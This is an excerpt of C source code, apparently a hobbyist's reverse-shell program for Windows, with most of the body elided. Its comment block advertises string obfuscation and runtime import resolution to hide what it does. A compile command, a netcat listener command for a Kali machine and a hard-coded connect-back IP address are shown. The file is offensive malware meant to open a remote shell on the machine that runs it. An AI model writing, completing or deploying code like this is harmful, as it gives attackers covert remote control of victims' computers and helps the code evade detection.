/*
 * Simple Reverse Shell in C using IAT Resolution and Obfuscation
 * Copyright (c) 2025 28zaakypro@proton.me
 *
 * Description: This code implements a simple reverse shell in C that connects back to a specified IP address and port.
 * Techniques: IAT Resolution and String Obfuscation
 ...
 */
 ...
 // compile with : gcc -o Obf_ReverseShell.exe ReverseShell.c -lws2_32

 // On kali linux : nc -lvnp 8888
...
int main()
{
    ...
    target.sin_addr.s_addr = inet_addr_("192.168.56.113"); // Put your kali linux ip here
